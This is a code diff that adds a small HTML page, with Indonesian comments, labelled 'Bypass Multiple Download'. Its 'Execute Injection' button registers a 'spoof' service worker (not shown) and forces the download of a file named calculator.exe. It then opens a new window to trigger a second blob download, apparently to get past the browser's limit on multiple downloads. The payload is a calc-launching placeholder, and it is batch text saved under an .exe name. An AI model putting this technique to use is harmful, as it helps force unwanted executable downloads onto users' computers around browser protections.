@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Bypass Multiple Download</title>
+    <style>
+        body { font-family: system-ui, sans-serif; max-width: 400px; margin: 40px auto; text-align: center; }
+        button { width: 100%; padding: 12px; background: #0056b3; color: #fff; border: none; border-radius: 4px; cursor: pointer; }
+    </style>
+</head>
+<body>
+    <h2>Bypass Multiple Download</h2>
+    <button onclick="run()">Execute Injection</button>
+    <script>
+        // 1. Daftar Service Worker (butuh HTTPS, GitHub Pages sudah ok)
+        if ('serviceWorker' in navigator) {
+            window.addEventListener('load', () => {
+                navigator.serviceWorker.register('sw-spoof.js')
+                    .then(reg => console.log('SW terdaftar di:', reg.scope))
+                    .catch(err => console.error('Gagal daftarkan SW:', err));
+            });
+        }
+
+        // 2. Fungsi download yang membuat file .exe
+        function download(name, content) {
+            const a = document.createElement('a');
+            // Tipe octet-stream memaksa browser menyimpan sebagai .exe
+            a.href = URL.createObjectURL(new Blob([content], { type: 'application/octet-stream' }));
+            a.download = name;
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+        }
+
+        // 3. Fungsi utama
+        function run() {
+            // Unduhan pertama
+            download('calculator.exe', '@echo off\nstart calc.exe');
+
+            // Jendela baru setelah 500ms
+            setTimeout(() => {
+                const win = window.open('', '_blank');
+                if (win) {
+                    // ✅ PERUBAHAN KUNCI: pindah langsung ke blob URL di jendela baru
+                    // Hal ini lebih andal untuk memicu unduhan di browser modern
+                    win.location = URL.createObjectURL(new Blob(['@echo off\nstart calc.exe'], { type: 'application/octet-stream' }));
+                }
+            }, 500);
+        }
+    </script>
+</body>
+</html>
